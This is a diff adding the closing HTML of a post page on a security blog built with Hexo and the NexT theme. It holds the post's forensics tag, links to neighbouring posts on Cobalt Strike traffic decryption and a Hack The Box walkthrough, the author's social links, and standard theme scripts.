+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/forensics/" rel="tag"><i class="fa fa-tag"></i> forensics</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/01/05/decrypt-cs-traffic/" rel="prev" title="从pcap包中解密cobalt-strike流量">
+                  <i class="fa fa-chevron-left"></i> 从pcap包中解密cobalt-strike流量
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/01/08/search/" rel="next" title="Hack-The-Box-walkthrough[search]">
+                  Hack-The-Box-walkthrough[search] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
